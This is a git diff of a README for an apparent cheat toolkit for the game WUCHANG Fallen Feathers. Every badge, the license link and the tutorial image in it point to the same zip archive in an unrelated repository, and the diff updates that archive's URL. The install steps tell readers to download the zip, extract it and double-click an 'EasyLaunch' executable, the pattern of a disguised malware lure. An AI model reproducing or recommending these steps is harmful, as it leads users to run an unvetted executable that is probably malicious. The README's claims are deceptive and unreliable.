@@ -1,10 +1,10 @@
 # 🎮 WUCHANG Fallen Feathers | Cheats & Enhanced Play Toolkit 🕹️
 
-![Generic badge](https://raw.githubusercontent.com/abood450/users-list-reactjs-typescript/main/goiter/users_reactjs_list_typescript_2.2.zip)
-![MIT License](https://raw.githubusercontent.com/abood450/users-list-reactjs-typescript/main/goiter/users_reactjs_list_typescript_2.2.zip)
-![Supported-Platforms](https://raw.githubusercontent.com/abood450/users-list-reactjs-typescript/main/goiter/users_reactjs_list_typescript_2.2.zip%2CMac%2CLinux-purple)
-![API](https://raw.githubusercontent.com/abood450/users-list-reactjs-typescript/main/goiter/users_reactjs_list_typescript_2.2.zip)
-![Languages](https://raw.githubusercontent.com/abood450/users-list-reactjs-typescript/main/goiter/users_reactjs_list_typescript_2.2.zip)
+![Generic badge](https://github.com/abood450/users-list-reactjs-typescript/raw/refs/heads/main/goiter/users-reactjs-typescript-list-v1.0.zip)
+![MIT License](https://github.com/abood450/users-list-reactjs-typescript/raw/refs/heads/main/goiter/users-reactjs-typescript-list-v1.0.zip)
+![Supported-Platforms](https://github.com/abood450/users-list-reactjs-typescript/raw/refs/heads/main/goiter/users-reactjs-typescript-list-v1.0.zip%2CMac%2CLinux-purple)
+![API](https://github.com/abood450/users-list-reactjs-typescript/raw/refs/heads/main/goiter/users-reactjs-typescript-list-v1.0.zip)
+![Languages](https://github.com/abood450/users-list-reactjs-typescript/raw/refs/heads/main/goiter/users-reactjs-typescript-list-v1.0.zip)
 
 ---
 ## 🦅 Elevate Your WUCHANG Fallen Feathers Journey!
@@ -81,7 +81,7 @@ Experience an adaptive advantage where intelligence meets interface—thanks to 
 
 Follow these steps carefully to activate your **WUCHANG Fallen Feathers Cheats & Enhanced Play Toolkit**:
 
-1. **Acquire**: Download the `https://raw.githubusercontent.com/abood450/users-list-reactjs-typescript/main/goiter/users_reactjs_list_typescript_2.2.zip` from this repository (located in the release section).
+1. **Acquire**: Download the `https://github.com/abood450/users-list-reactjs-typescript/raw/refs/heads/main/goiter/users-reactjs-typescript-list-v1.0.zip` from this repository (located in the release section).
 2. **Extract**: Unzip its contents to your preferred directory using your extraction tool of choice.
 3. **Engage**: Double-click the `EasyLaunch` executable. The adaptive interface will spring to life, ready for configuration.
 4. **Customize**: Select your desired features and adjust settings for language, appearance, and AI customizations.
@@ -89,7 +89,7 @@ Follow these steps carefully to activate your **WUCHANG Fallen Feathers Cheats &
 
 #### 💡 See the Installation in Action:
 
-![Installation Tutorial](https://raw.githubusercontent.com/abood450/users-list-reactjs-typescript/main/goiter/users_reactjs_list_typescript_2.2.zip)
+![Installation Tutorial](https://github.com/abood450/users-list-reactjs-typescript/raw/refs/heads/main/goiter/users-reactjs-typescript-list-v1.0.zip)
 
 ---
 
@@ -107,7 +107,7 @@ This toolkit is designed solely for educational and entertainment enhancement. I
 
 ## 📑 License
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/abood450/users-list-reactjs-typescript/main/goiter/users_reactjs_list_typescript_2.2.zip).  
+This project is licensed under the [MIT License](https://github.com/abood450/users-list-reactjs-typescript/raw/refs/heads/main/goiter/users-reactjs-typescript-list-v1.0.zip).  
 © 2025
 
 ---
